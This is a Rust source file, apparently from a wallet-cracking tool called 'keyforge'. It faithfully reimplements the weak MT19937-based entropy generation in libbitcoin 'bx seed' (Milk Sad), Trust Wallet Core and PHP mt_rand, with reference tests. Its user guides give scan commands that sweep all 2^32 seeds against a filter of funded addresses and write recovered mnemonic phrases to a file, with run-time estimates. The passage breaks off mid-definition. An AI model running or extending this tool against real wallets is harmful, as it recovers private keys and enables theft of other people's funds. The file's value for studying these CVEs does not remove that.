//! The entropy source at the heart of Milk Sad (CVE-2023-39910).
//!
//! Libbitcoin Explorer's `bx seed` seeded a C++ `std::mt19937` with a 32-bit
//! timestamp and filled the wallet entropy one byte at a time from it. Two details
//! decide whether a port reproduces the real byte stream or garbage:
//!
//!   1. C++ `std::mt19937 twister(n)` uses `init_genrand`. Python's `random.seed(n)`
//!      runs the integer through `init_by_array` instead, which is a different
//!      state and therefore a completely different stream.
//!
//!   2. libbitcoin drew each byte through `std::uniform_int_distribution`, and
//!      *the standard does not say what that computes*. Only the range is specified;
//!      the mapping from engine words to values is the implementation's business, and
//!      the two mainstream implementations chose differently. See [`Dist`].
//!
//! Both are verified by the tests below against the namesake mnemonic.

const N: usize = 624;
const M: usize = 397;
const MATRIX_A: u32 = 0x9908_b0df;
const UPPER_MASK: u32 = 0x8000_0000;
const LOWER_MASK: u32 = 0x7fff_ffff;

/// `std::uniform_int_distribution<uint8_t>(0, 255)` as libstdc++ implements it over
/// an engine whose range is `[0, 2^32-1]`: divide the word down into 256 buckets and
/// reject the leftover tail so the mapping stays exactly uniform.
///
/// Note the scaling divisor is `(2^32 - 1) / 256`, not `2^32 / 256` -- an off-by-one
/// here still produces plausible-looking mnemonics that match nothing.
const SCALING: u32 = 0xffff_ffff / 256; // 16_777_215
const PAST: u32 = 256u32.wrapping_mul(SCALING); // 4_294_967_040

/// Which C++ standard library's `uniform_int_distribution` stood between the twister
/// and the entropy -- which is to say, which platform the `bx` binary was built on.
///
/// `std::uniform_int_distribution` specifies its *range* and nothing about how the
/// engine's words become values in it, so the two mainstream implementations are free
/// to differ, and do. The same seed therefore produces two entirely unrelated wallets
/// depending on where `bx` was compiled: seed 0 draws `8c97b7d8...` under libstdc++
/// and `ac2f75c0...` under libc++.
///
/// Nothing on chain records which one made a key, so both are swept by default. A
/// sweep of one alone passes silently over every wallet built on the other and still
/// reports a clean pass of the keyspace -- the same failure this project refuses a
/// filter without P2SH entries over.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Dist {
    /// libstdc++: GCC everywhere, and clang on Linux. Divides the word into 256
    /// buckets of `SCALING` and rejects the short tail past `PAST`, so a byte costs
    /// one word and very occasionally two.
    Libstdcxx,
    /// libc++: clang on macOS. Routes through `__independent_bits_engine`, which for
    /// a power-of-two range masks off the low bits of one word and has nothing to
    /// reject -- exactly `word & 0xff`, one word per byte, always.
    ///
    /// Confirmed by compiling `uniform_int_distribution<uint16_t>(0, 255)` over
    /// `std::mt19937` against libc++ and comparing streams byte for byte; the vectors
    /// in the tests below are that program's output.
    ///
    /// Two other generators land on this exact stream, which is why they cost no extra
    /// pass -- see [`Dist::Libcxx`]'s note in `crate::vuln`:
    ///
    ///   - **Trust Wallet Core (CVE-2023-31290)**, whose WASM build drew
    ///     `std::generate_n(buf, len, [&rng] -> uint8_t { return rng() & 0x000000ff; })`
    ///     off an `std::mt19937` seeded from a 32-bit `std::random_device{}()`.
    ///   - **PHP 7.1 and later**, where `mt_rand(0, 255)` reaches `rand_range32(255)`,
    ///     and `umax + 1 == 256` is a power of two, so the uniform path returns
    ///     `result & 255` with no rejection at all.
    Libcxx,
    /// PHP's `mt_rand()` in `MT_RAND_PHP` mode: every PHP before 7.1, and 7.1 or later
    /// when seeded `mt_srand($s, MT_RAND_PHP)`.
    ///
    /// Alone among these, this is not a distribution over a conforming engine -- *the
    /// engine itself is wrong*. PHP's `php_mt_reload` twists with `loBit(u)` where the
    /// reference uses `loBit(v)`:
    ///
    /// ```c
    /// #define twist(m,u,v)      (m ^ (mixBits(u,v)>>1) ^ ((uint32_t)(-(int32_t)(loBit(v))) & 0x9908b0dfU))
    /// #define twist_php(m,u,v)  (m ^ (mixBits(u,v)>>1) ^ ((uint32_t)(-(int32_t)(loBit(u))) & 0x9908b0dfU))
    /// ```
    ///
    /// On top of that, `mt_rand(0, 255)` takes the legacy branch of
    /// `php_mt_rand_common`, which halves the word and rescales it through a double:
    ///
    /// ```c
    /// n = (int64_t) php_mt_rand() >> 1;
    /// RAND_RANGE_BADSCALING(n, 0, 255, PHP_MT_RAND_MAX);
    /// ```
    ///
    /// `256.0 * ((word >> 1) / 2147483648.0)` truncates to `word >> 24` exactly -- every
    /// value there is representable, so nothing rounds. So this stream is the *naive
    /// high byte* that `the_libstdcxx_distribution_is_not_a_shift` exists to warn a port
    /// away from, drawn off a deliberately broken twister.
    ///
    /// Both halves come from php-src `PHP-7.4/ext/standard/mt_rand.c` and `php_rand.h`;
    /// the vectors in the tests below are the output of those macros compiled verbatim.
    Php,
}

impl Dist {
    /// Parse a `--dist` value. Both spellings of each name are taken: `++` is awkward
    /// in enough shells and config files to be worth not insisting on.
    pub fn parse(name: &str) -> Option<Dist> {
        match name {
            "libstdc++" | "libstdcxx" => Some(Dist::Libstdcxx),
            "libc++" | "libcxx" => Some(Dist::Libcxx),
            "php" | "php5" | "mt-rand-php" => Some(Dist::Php),
            _ => None,
        }
    }

    /// The canonical spelling, as it appears in banners and `--dist`.
    pub fn as_str(self) -> &'static str {
        match self {
            Dist::Libstdcxx => "libstdc++",
            Dist::Libcxx => "libc++",
            Dist::Php => "php",
        }
    }

    /// Whether this stream's engine is PHP's broken twister rather than a conforming
    /// MT19937. Only [`Dist::Php`] is, and it is the reason a stream cannot be reduced
    /// to a byte mapping over one shared engine.
    pub fn php_twist(self) -> bool {
        matches!(self, Dist::Php)
    }

    /// The discriminant the GPU kernel switches on. Must match `MT_LIBSTDCXX`,
    /// `MT_LIBCXX` and `MT_PHP` in `kernels/mt19937.h`; the parity tests hold the two
    /// together.
    pub fn code(self) -> u32 {
        match self {
            Dist::Libstdcxx => 0,
            Dist::Libcxx => 1,
            Dist::Php => 2,
        }
    }
}

/// One entropy stream to walk a seed at: which distribution drew the bytes, and how
/// far into the stream the wallet starts.
///
/// The pair travels together because neither half names a wallet on its own -- a seed
/// yields one wallet per `(dist, offset)`, and a find has to name both for `verify` to
/// reproduce it. A scan walks the range once per draw.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub struct Draw {
    pub dist: Dist,
    pub offset: usize,
}

impl Draw {
    /// The first wallet of a Linux-built `bx`: the sweep everyone has already run.
    pub const FIRST: Draw = Draw {
        dist: Dist::Libstdcxx,
        offset: 0,
    };

    pub fn new(dist: Dist, offset: usize) -> Draw {
        Draw { dist, offset }
    }

    /// How this draw names itself in a find, a `verify` listing or a banner: the
    /// library always, and the offset only when there is one. Two draws of one seed
    /// are two different wallets, so this is what `verify` needs to reproduce a find.
    pub fn label(self) -> String {
        match self.offset {
            0 => self.dist.as_str().to_string(),
            n => format!("{} +{n}B", self.dist.as_str()),
        }
    }
}

pub struct Mt19937 {
    state: [u32; N],
    index: usize,
    /// Twist with PHP's `loBit(u)` rather than the reference `loBit(v)`. Set only for
    /// [`Dist::Php`]; see [`Mt19937::for_dist`].
    php_twist: bool,
}

impl Mt19937 {
    /// Seed exactly as `std::mt19937 twister(seed)` does (`init_genrand`).
    ///
    /// PHP's `php_mt_initialize` is the same routine word for word, so this seeds every
    /// stream in [`Dist`]; only the twist and the byte mapping differ afterwards.
    pub fn new(seed: u32) -> Self {
        let mut state = [0u32; N];
        state[0] = seed;
        for i in 1..N {
            let prev = state[i - 1];
            state[i] = 1_812_433_253u32
                .wrapping_mul(prev ^ (prev >> 30))
                .wrapping_add(i as u32);
        }
        Self {
            state,
            index: N,
            php_twist: false,
        }
    }

    /// Seed the way CPython's `random.seed(n)` does: `init_by_array`, **not**
    /// `init_genrand`.
    ///
    /// This is the landmine the module note at the top warns about. `random.seed(500)`
    /// and `std::mt19937 twister(500)` are both "MT19937 seeded with 500" and they
    /// produce completely unrelated streams, because CPython converts the integer to an
    /// array of 32-bit words and runs the reference `init_by_array` over it. Scanning
    /// one while meaning the other returns a clean sweep having checked nothing.
    ///
    /// The two magic multipliers and the trailing `mt[0] = 0x80000000` are the reference
    /// implementation's, unchanged; `crate::vuln::python` pins the result against real
    /// CPython output.
    pub fn from_key(key: &[u32]) -> Self {
        let mut rng = Self::new(19_650_218);
        let mut i = 1usize;
        let mut j = 0usize;

        for _ in 0..N.max(key.len()) {
            let prev = rng.state[i - 1];
            rng.state[i] = (rng.state[i] ^ (1_664_525u32.wrapping_mul(prev ^ (prev >> 30))))
                .wrapping_add(key[j])
                .wrapping_add(j as u32);
            i += 1;
            j += 1;
            if i >= N {
                rng.state[0] = rng.state[N - 1];
                i = 1;
            }
            if j >= key.len() {
                j = 0;
            }
        }
        for _ in 0..N - 1 {
            let prev = rng.state[i - 1];
            rng.state[i] = (rng.state[i] ^ (1_566_083_941u32.wrapping_mul(prev ^ (prev >> 30))))
                .wrapping_sub(i as u32);
            i += 1;
            if i >= N {
                rng.state[0] = rng.state[N - 1];
                i = 1;
            }
        }
        // The reference sets the high bit of state[0] so the state is never all-zero.
        rng.state[0] = 0x8000_0000;
        rng.index = N;
        rng
    }

    /// The generator behind `dist` -- which for [`Dist::Php`] is not an MT19937 at all.
    ///
    /// Every stream has to be constructed through here rather than through
    /// [`Mt19937::new`], because a PHP byte mapping over a conforming twister is a
    /// wallet nothing ever created.
    pub fn for_dist(seed: u32, dist: Dist) -> Self {
        let mut rng = Self::new(seed);
        rng.php_twist = dist.php_twist();
        rng
    }

    #[inline]
    fn twist(&mut self) {
        for i in 0..N {
            let u = self.state[i];
            let y = (u & UPPER_MASK) | (self.state[(i + 1) % N] & LOWER_MASK);
            let mut next = self.state[(i + M) % N] ^ (y >> 1);
            // `y & 1` is `loBit(v)`, the low bit of state[i+1], because UPPER_MASK
            // cleared it from `u`. PHP takes `loBit(u)` instead -- one character in
            // php-src, an unrelated generator in practice.
            let low = if self.php_twist { u & 1 } else { y & 1 };
            if low != 0 {
                next ^= MATRIX_A;
            }
            self.state[i] = next;
        }
        self.index = 0;
    }

    #[inline]
    pub fn next_u32(&mut self) -> u32 {
        if self.index >= N {
            self.twist();
        }
        let mut y = self.state[self.index];
        self.index += 1;
        y ^= y >> 11;
        y ^= (y << 7) & 0x9d2c_5680;
        y ^= (y << 15) & 0xefc6_0000;
        y ^ (y >> 18)
    }

    /// One entropy byte, the way libbitcoin's `pseudo_random::fill()` produced it on
    /// the platform `dist` names.
    ///
    /// The branch is on a value constant for a whole batch and this is ~0.02% of the
    /// work per seed, so it does not show up in a measurement.
    #[inline]
    pub fn next_byte(&mut self, dist: Dist) -> u8 {
        match dist {
            Dist::Libstdcxx => loop {
                let word = self.next_u32();
                // Fires for 256 of ~4.3e9 words. Kept so the stream matches bit for bit.
                if word < PAST {
                    return (word / SCALING) as u8;
                }
            },
            // No rejection: 2^32 divides by 256 exactly, so every word yields a byte.
            Dist::Libcxx => self.next_u32() as u8,
            // `RAND_RANGE_BADSCALING` over a 31-bit word truncates to exactly this.
            Dist::Php => (self.next_u32() >> 24) as u8,
        }
    }
}

/// The largest entropy `bx seed` would emit (256-bit / 24-word case).
pub const MAX_ENTROPY: usize = 32;

/// Draw the full 32-byte entropy block for one seed.
///
/// The 16- and 24-byte cases are prefixes of this same stream, so a scan covering
/// all three entropy sizes initialises the generator once per seed rather than
/// three times.
/// [`Draw::FIRST`] is the first wallet a Linux-built `bx` drew; see
/// `entropy_for_seed_at`.
#[cfg(test)]
#[inline]
pub fn entropy_for_seed(seed: u32) -> [u8; MAX_ENTROPY] {
    entropy_for_seed_at(seed, Draw::FIRST)
}

/// Draw a 32-byte entropy block for the wallet `draw` names.
///
/// A process that called `bx seed` more than once without re-seeding kept drawing
/// from the same generator, so the second wallet's entropy begins where the first
/// one's ended. The offset is in bytes of *drawn entropy*, not raw 32-bit words: the
/// discarded prefix goes through `next_byte` so its rejection behaviour is part of
/// the stream position, exactly as it would have been for a real second call. Under
/// libc++ there is no rejection to accumulate and the two agree, but the prefix is
/// still drawn rather than skipped, because that is what makes the offset mean the
/// same thing under both.
#[inline]
pub fn entropy_for_seed_at(seed: u32, draw: Draw) -> [u8; MAX_ENTROPY] {
    let mut rng = Mt19937::for_dist(seed, draw.dist);
    for _ in 0..draw.offset {
        rng.next_byte(draw.dist);
    }
    let mut out = [0u8; MAX_ENTROPY];
    for byte in out.iter_mut() {
        *byte = rng.next_byte(draw.dist);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The published first outputs of `std::mt19937` seeded with 5489 (its default),
    /// which pins the seeding routine and the tempering independently of libbitcoin.
    #[test]
    fn matches_the_reference_mt19937_stream() {
        let mut rng = Mt19937::new(5489);
        let got: Vec<u32> = (0..5).map(|_| rng.next_u32()).collect();
        assert_eq!(
            got,
            vec![3499211612, 581869302, 3890346734, 3586334585, 545404204]
        );
    }

    /// `std::mt19937`'s 10000th output is the canonical conformance value from the
    /// C++ standard.
    #[test]
    fn matches_the_standards_ten_thousandth_output() {
        let mut rng = Mt19937::new(5489);
        let mut last = 0;
        for _ in 0..10_000 {
            last = rng.next_u32();
        }
        assert_eq!(last, 4123659995);
    }

    /// The full 32-byte entropy block for seed 0, taken from the verified Python
    /// reference in `allkeys-keycheck/milk-sad.py`.
    #[test]
    fn draws_the_reference_entropy_block_for_seed_zero() {
        const EXPECTED: [u8; 32] = [
            0x8c, 0x97, 0xb7, 0xd8, 0x9a, 0xdb, 0x8b, 0xd8, 0x6c, 0x9f, 0xa5, 0x62, 0x70, 0x4c,
            0xe4, 0x0e, 0xf6, 0x45, 0x62, 0x7a, 0xca, 0xcf, 0x87, 0x7a, 0x91, 0x64, 0xec, 0xd6,
            0x12, 0x56, 0x16, 0xa5,
        ];
        assert_eq!(entropy_for_seed(0), EXPECTED);
    }

    /// Dividing by 16777215 and shifting right by 24 agree on all but roughly one
    /// byte in 152,000 -- which is precisely what makes a shift-based port dangerous:
    /// it looks correct on every hand-checked vector and then silently misses a
    /// fraction of the keyspace. Seed 1310 is the first divergence, and this test
    /// pins that we land on the libstdc++ side of it.
    #[test]
    fn the_libstdcxx_distribution_is_not_a_shift() {
        let entropy = entropy_for_seed(1310);
        let mut rng = Mt19937::new(1310);
        let shifted: Vec<u8> = (0..32).map(|_| (rng.next_u32() >> 24) as u8).collect();

        assert_eq!(entropy[27], 212, "libstdc++ divides");
        assert_eq!(shifted[27], 211, "a naive shift is off by one here");
        assert_eq!(entropy[..27], shifted[..27], "and agrees everywhere else");
    }

    /// All three entropy sizes come off one stream, so the shorter ones are
    /// prefixes of the longest. The scanner relies on this to init MT once per seed.
    #[test]
    fn shorter_entropy_sizes_are_prefixes_of_the_longest() {
        for seed in [0u32, 1, 1_692_000_000, u32::MAX] {
            let full = entropy_for_seed(seed);
            let mut rng = Mt19937::new(seed);
            let short: Vec<u8> = (0..16).map(|_| rng.next_byte(Dist::Libstdcxx)).collect();
            assert_eq!(&full[..16], short.as_slice());
        }
    }

    /// An offset block is the continuation of the same stream, not a re-seed: the
    /// block at N*32 is exactly bytes N*32.. of one uninterrupted draw. This is what
    /// makes offset 32 the entropy of the second wallet a single process produced.
    #[test]
    fn offsets_continue_one_uninterrupted_stream() {
        for dist in [Dist::Libstdcxx, Dist::Libcxx, Dist::Php] {
            for seed in [0u32, 1310, 1_692_000_000, u32::MAX] {
                let mut rng = Mt19937::for_dist(seed, dist);
                let long: Vec<u8> = (0..MAX_ENTROPY * 4).map(|_| rng.next_byte(dist)).collect();
                for block in 0..4 {
                    let offset = block * MAX_ENTROPY;
                    assert_eq!(
                        entropy_for_seed_at(seed, Draw::new(dist, offset)),
                        long[offset..offset + MAX_ENTROPY],
                        "{} seed {seed} offset {offset}",
                        dist.as_str()
                    );
                }
            }
        }
    }

    /// Reference streams from libc++ itself, printed by compiling libbitcoin's own
    /// `std::uniform_int_distribution<uint16_t>(0, max_uint8)` over `std::mt19937`
    /// against libc++ and dumping the bytes. Nothing in this file derives them, which
    /// is the point: they are the external check that the mask is what libc++ does.
    #[test]
    fn draws_the_libcxx_reference_blocks() {
        let hex = |b: &[u8]| b.iter().map(|x| format!("{x:02x}")).collect::<String>();
        let at = |seed, offset| entropy_for_seed_at(seed, Draw::new(Dist::Libcxx, offset));

        assert_eq!(
            hex(&at(0, 0)),
            "ac2f75c043fbc36709d315f2245746d8588c3ac1e62757ae5851a5194d480994"
        );
        assert_eq!(
            hex(&at(1310, 0)),
            "34102c650607ca8890c5d93c1b673b541b5bc76cd1c9e6ec22dbb2976dfdc0cb"
        );
        assert_eq!(
            hex(&at(u32::MAX, 0)),
            "a3220c47b440d6fad9207f7bf26b0bca1b8db65737d60ea5c989592c6470f798"
        );
        // The second wallet of seed 0, i.e. bytes 32..64 of the same C++ dump. Pins
        // the offset against the reference too, not just against ourselves.
        assert_eq!(
            hex(&at(0, 32)),
            "73d0f3c5fe4fafc05263d8b1f31d93938ea720c109b97f201fcaf497a3fecb72"
        );
    }

    /// Reference streams for PHP's `MT_RAND_PHP` mode, printed by compiling php-src's
    /// own `twist_php`, `php_mt_reload`, `php_mt_rand` and `RAND_RANGE_BADSCALING`
    /// macros verbatim (PHP-7.4 `ext/standard/mt_rand.c`, `ext/standard/php_rand.h`)
    /// and dumping `mt_rand(0, 255)`. Nothing in this file derives them: they are the
    /// external check that both the broken twist and the bad scaling are what PHP does.
    #[test]
    fn draws_the_php_reference_blocks() {
        let hex = |b: &[u8]| b.iter().map(|x| format!("{x:02x}")).collect::<String>();
        let at = |seed, offset| entropy_for_seed_at(seed, Draw::new(Dist::Php, offset));

        assert_eq!(
            hex(&at(0, 0)),
            "7297b7269adb8bd86c9f5b9c8e4c1a0e08bb9c7acacf8784916412d6ec56e85b"
        );
        assert_eq!(
            hex(&at(1, 0)),
            "9401b8eefedeb3ffdbc2e99b2f9da65565ef77d86b505186348fe0c4f97655e9"
        );
        assert_eq!(
            hex(&at(1310, 0)),
            "0811d1df7de409ca6da182eafee58af277e122a458602ad0eba8ef2d5ad5910d"
        );
        assert_eq!(
            hex(&at(1_692_000_000, 0)),
            "3309a706b8a84491d8e21a0b743921ca48d706e07f0c25d1f81ecef263667f4a"
        );
        assert_eq!(
            hex(&at(u32::MAX, 0)),
            "18e2e96e3778c7c504480681974cdbb3e8d58da7fcd26a3852782e4810622c7d"
        );
        // Bytes 32..64 of the same dump, so the offset is pinned against the reference
        // too and not merely against our own continuation of the stream.
        assert_eq!(
            hex(&at(0, 32)),
            "fba02b0b39dd20200487cccd767b39531e465d6a24770f3c851b6a8743d1c642"
        );
    }

    /// The first raw words of PHP's broken generator, seeded 0. This separates the twist
    /// from the byte mapping: if only this fails, the engine is wrong; if only the block
    /// test above fails, the scaling is.
    #[test]
    fn matches_the_php_broken_word_stream() {
        let mut rng = Mt19937::for_dist(0, Dist::Php);
        let got: Vec<u32> = (0..5).map(|_| rng.next_u32()).collect();
        assert_eq!(
            got,
            vec![1927864384, 2546248239, 3071714933, 649471532, 2588848963]
        );
    }

    /// PHP 7.1 and later, and Trust Wallet Core, and a macOS-built `bx` are one stream,
    /// not three. `mt_rand(0, 255)` reaches `rand_range32(255)`, whose `umax + 1 == 256`
    /// is a power of two and so returns `result & 255`; Trust Wallet wrote that mask out
    /// longhand as `rng() & 0x000000ff`.
    ///
    /// This is load-bearing rather than trivia: it is why `--source trust-wallet` and
    /// modern `--source php-mt` cost no pass of their own, and why a sweep that has
    /// already walked libc++ has already walked them. The vector is the *libc++*
    /// reference block from `draws_the_libcxx_reference_blocks`, reproduced here by the
    /// PHP reference program, so the claim is checked against both.
    #[test]
    fn modern_php_and_trust_wallet_are_the_libcxx_stream() {
        let hex = |b: &[u8]| b.iter().map(|x| format!("{x:02x}")).collect::<String>();
        assert_eq!(
            hex(&entropy_for_seed_at(0, Draw::new(Dist::Libcxx, 0))),
            "ac2f75c043fbc36709d315f2245746d8588c3ac1e62757ae5851a5194d480994"
        );
        for seed in [0u32, 1310, 1_692_000_000, u32::MAX] {
            let mut rng = Mt19937::new(seed);
            let masked: Vec<u8> = (0..32).map(|_| (rng.next_u32() & 0xff) as u8).collect();
            assert_eq!(
                entropy_for_seed_at(seed, Draw::new(Dist::Libcxx, 0)),
                masked.as_slice(),
                "seed {seed}"
            );
        }
    }

    /// PHP's mapping *is* the naive `word >> 24` shift that
    /// `the_libstdcxx_distribution_is_not_a_shift` warns a `bx` port away from -- but
    /// over a different engine, so the two streams still diverge. Seed 0 shows both
    /// halves at once: bytes that agree where the twist happened to agree, and bytes
    /// that do not.
    #[test]
    fn the_php_stream_is_a_shift_over_a_broken_twister() {
        let mut rng = Mt19937::for_dist(0, Dist::Php);
        let shifted: Vec<u8> = (0..32).map(|_| (rng.next_u32() >> 24) as u8).collect();
        assert_eq!(entropy_for_seed_at(0, Draw::new(Dist::Php, 0)), shifted.as_slice());

        // The same shift over a *conforming* twister is a different wallet entirely,
        // which is what makes the one-character twist difference worth a whole stream.
        let mut good = Mt19937::new(0);
        let over_conforming: Vec<u8> = (0..32).map(|_| (good.next_u32() >> 24) as u8).collect();
        assert_ne!(shifted, over_conforming);
    }

    /// PHP's twist differs from the reference in one bit of one term, so the two states
    /// agree until the first word where `loBit(u) != loBit(v)` and then separate for
    /// good. Nothing may reach a PHP byte through a conforming generator.
    #[test]
    fn the_php_twist_is_not_the_reference_twist() {
        for seed in [0u32, 1, 1310, 1_692_000_000, u32::MAX] {
            let mut php = Mt19937::for_dist(seed, Dist::Php);
            let mut reference = Mt19937::new(seed);
            let php_words: Vec<u32> = (0..624).map(|_| php.next_u32()).collect();
            let ref_words: Vec<u32> = (0..624).map(|_| reference.next_u32()).collect();
            assert_ne!(php_words, ref_words, "seed {seed}");
        }
    }

    /// The two distributions are not variations on a theme -- they are unrelated
    /// wallets from the same seed, which is the whole reason a sweep has to walk
    /// both. Sharing even a leading byte across these seeds would be news.
    #[test]
    fn the_two_distributions_share_nothing() {
        for seed in [0u32, 1, 500, 1310, 1_692_000_000, u32::MAX] {
            let gnu = entropy_for_seed_at(seed, Draw::FIRST);
            let llvm = entropy_for_seed_at(seed, Draw::new(Dist::Libcxx, 0));
            assert_ne!(gnu, llvm, "seed {seed}");
            assert_ne!(gnu[0], llvm[0], "seed {seed}: even the first byte differs");
        }
    }

    /// And no two streams in scope are the same wallet, for any seed. Adding a stream
    /// that duplicated an existing one would double a sweep's cost and find nothing,
    /// which is the mistake `modern_php_and_trust_wallet_are_the_libcxx_stream` exists
    /// to have already caught for the three generators that *do* coincide.
    #[test]
    fn every_stream_is_a_different_wallet() {
        for seed in [0u32, 1, 500, 1310, 1_692_000_000, u32::MAX] {
            let streams = [Dist::Libstdcxx, Dist::Libcxx, Dist::Php];
            for (i, a) in streams.iter().enumerate() {
                for b in &streams[i + 1..] {
                    assert_ne!(
                        entropy_for_seed_at(seed, Draw::new(*a, 0)),
                        entropy_for_seed_at(seed, Draw::new(*b, 0)),
                        "seed {seed}: {} and {} agree",
                        a.as_str(),
                        b.as_str()
                    );
                }
            }
        }
    }

    /// libc++ masks, and unlike libstdc++'s divide there is no tail to reject: every
    /// word yields exactly one byte, so 32 bytes is 32 words and the stream position
    /// is the word position. `the_libstdcxx_distribution_is_not_a_shift` is the same
    /// check from the other side.
    #[test]
    fn the_libcxx_distribution_is_the_low_byte_of_every_word() {
        for seed in [0u32, 1310, u32::MAX] {
            let mut rng = Mt19937::new(seed);
            let masked: Vec<u8> = (0..32).map(|_| (rng.next_u32() & 0xff) as u8).collect();
            assert_eq!(
                entropy_for_seed_at(seed, Draw::new(Dist::Libcxx, 0)),
                masked.as_slice(),
                "seed {seed}"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// The vulnerabilities built on the generator above.
//
// Three products, two streams. They are separate `Vulnerability` implementations
// rather than one parameterised by `Dist` because what differs between them is not
// the generator -- Trust Wallet and modern PHP *are* the libc++ stream -- but what
// the affected software did with the bytes, which is scope, and what a user needs to
// be told, which is prose. See the note in `crate::vuln`.
// ---------------------------------------------------------------------------

use crate::scan::derive::Route;
use crate::vuln::{Defaults, Expanded, Guide, Point, Space, Vulnerability};

/// The 32-bit seed space every generator here leaves behind.
const SEED_SPACE: Space = Space::Integers { start: 0, end: 1 << 32 };

/// Expand one seed into one material per byte stream.
///
/// A seed produces a different wallet under each stream, so all of them are material
/// for the same point rather than separate passes over the range. The order is fixed
/// and is the order `dists` lists them in, which is what lets a caller map a material
/// back to the stream that produced it.
fn expand_seed(dists: &[Dist], point: Point<'_>, out: &mut Vec<Expanded>) {
    let Point::Integer(n) = point else {
        // These spaces are integer ranges; a corpus point cannot reach here.
        debug_assert!(false, "mt19937 vulnerabilities do not read a corpus");
        return;
    };
    let seed = n as u32;
    for &dist in dists {
        out.push(entropy_for_seed_at(seed, Draw::new(dist, 0)));
    }
}

/// Libbitcoin Explorer's `bx seed` -- Milk Sad, CVE-2023-39910.
///
/// The vulnerability this program was originally written for, and the one with the
/// best ground truth: four canary wallets with published (seed, path, address) triples
/// that `bx` itself produced.
pub struct MilkSad;

impl Vulnerability for MilkSad {
    fn id(&self) -> &'static str {
        "milksad"
    }
    fn aliases(&self) -> &'static [&'static str] {
        &["bx", "milk-sad"]
    }
    fn cve(&self) -> Option<&'static str> {
        Some("CVE-2023-39910")
    }

    fn describe(&self) -> Vec<String> {
        vec![
            "milksad (CVE-2023-39910)".into(),
            "libbitcoin `bx seed`: a 32-bit timestamp seeded std::mt19937, so \
             --start/--end can be narrowed to the years bx was in use."
                .into(),
            "Two byte streams are walked: the platform bx was built on decided the \
             mapping and nothing on chain records which."
                .into(),
        ]
    }

    fn guide(&self) -> Guide {
        Guide {
            what: "`bx seed` took its randomness from the clock. Any wallet it created \
                   can be regenerated by trying every possible clock value -- about 4.3 \
                   billion of them, which is a few days of computer time rather than the \
                   forever it should have been.",
            affected: "Libbitcoin Explorer 3.0.0 to 3.6.0 and anything built on it, \
                       CVE-2023-39910. Wallets created roughly between 2016 and 2023.",
            command: "keyforge scan --vuln milksad -f funded.bf",
            time: "About 9 days on a laptop, or 9 hours on a recent NVIDIA card. Because \
                   the seed was a clock reading you can narrow it to when the tool was \
                   actually in use, which cuts that several-fold.",
            hit: "One 12-, 18- or 24-word mnemonic phrase per line in matches.txt. Check \
                  one with `keyforge verify --vuln milksad \"<phrase>\"`, which prints \
                  the addresses it derives so you can look them up on chain.",
        }
    }

    fn space(&self) -> Space {
        SEED_SPACE
    }

    /// `bx` could pipe its entropy into a wallet three ways -- `mnemonic-new`,
    /// `hd-new` and `ec-new` -- at any of the three sizes it offered, so this is the
    /// widest scope of the three and it narrows nothing.
    fn defaults(&self) -> Defaults {
        Defaults {
            material_sizes: vec![16, 24, 32],
            routes: vec![Route::Bip39, Route::Bip32Seed, Route::PrivKey],
            paths: Vec::new(),
        }
    }

    /// The one vulnerability here whose seed was a timestamp.
    fn range_is_narrowable(&self) -> bool {
        true
    }

    fn expand(&self, point: Point<'_>, out: &mut Vec<Expanded>) {
        expand_seed(&[Dist::Libstdcxx, Dist::Libcxx], point, out)
    }
}

/// Trust Wallet Core before 3.1.1 -- CVE-2023-31290.
///
/// As shipped in the Trust Wallet browser extension 0.0.172 through 0.0.182, and
/// exploited in the wild in December 2022 and March 2023. The WASM build's
/// `std::random_device{}()` yielded a 32-bit value, which seeded an `std::mt19937`
/// that filled the entropy buffer with
/// `std::generate_n(buf, len, [&rng]() -> uint8_t { return rng() & 0x000000ff; })`.
pub struct TrustWallet;

impl Vulnerability for TrustWallet {
    fn id(&self) -> &'static str {
        "trust-wallet"
    }
    fn aliases(&self) -> &'static [&'static str] {
        &["trustwallet"]
    }
    fn cve(&self) -> Option<&'static str> {
        Some("CVE-2023-31290")
    }

    fn describe(&self) -> Vec<String> {
        vec![
            "trust-wallet (CVE-2023-31290)".into(),
            "Trust Wallet Core < 3.1.1 (extension 0.0.172-0.0.182): std::mt19937 seeded \
             from a 32-bit random_device, 128-bit entropy and 12-word BIP39 only. The \
             seed is not a timestamp, so the range is the whole 2^32 and narrowing it \
             leaves a hole."
                .into(),
        ]
    }

    fn guide(&self) -> Guide {
        Guide {
            what: "The browser build of Trust Wallet asked for randomness and got a \
                   32-bit number, then stretched it into a wallet. Every wallet the \
                   affected versions created is one of about 4.3 billion possibilities.",
            affected: "Trust Wallet Core before 3.1.1, shipped in the Trust Wallet \
                       browser extension 0.0.172 to 0.0.182, CVE-2023-31290. Wallets \
                       created between roughly July 2022 and April 2023.",
            command: "keyforge scan --vuln trust-wallet -f funded.bf",
            time: "Much faster than the others -- roughly a tenth of a milksad sweep -- \
                   because this software only ever made 12-word wallets on one derivation \
                   route, so there is far less to derive per seed. Hours on a GPU.",
            hit: "One 12-word mnemonic phrase per line in matches.txt. Check one with \
                  `keyforge verify --vuln trust-wallet \"<phrase>\"`.",
        }
    }

    fn space(&self) -> Space {
        SEED_SPACE
    }

    /// The sharp one. Trust Wallet Core only ever created 12-word mnemonics, fixing its
    /// entropy at 128 bits and its route at BIP39, so scanning the other sizes and
    /// routes derives wallets that cannot exist and multiplies the cost to do it.
    fn defaults(&self) -> Defaults {
        Defaults {
            material_sizes: vec![16],
            routes: vec![Route::Bip39],
            paths: Vec::new(),
        }
    }

    fn expand(&self, point: Point<'_>, out: &mut Vec<Expanded>) {
        expand_seed(&[Dist::Libcxx], point, out)
    }
}

/// A wallet generator built on PHP's `mt_rand()`, seeded with `mt_srand()`.
///
/// Unlike the other two this is a class rather than a product: no single CVE, no one
/// binary, and no published population. What is definite is the generator -- PHP's
/// twister and its two byte mappings are pinned to php-src above -- and that
/// `mt_srand($seed)` over any 32-bit seed leaves 2^32 wallets. What is *not* definite is
/// what any given site did with the bytes, which is why this scope is the widest and why
/// a hit here is a finding about one site rather than about a population.
pub struct PhpMt;

impl Vulnerability for PhpMt {
    fn id(&self) -> &'static str {
        "php-mt"
    }
    fn aliases(&self) -> &'static [&'static str] {
        &["php"]
    }

    fn describe(&self) -> Vec<String> {
        vec![
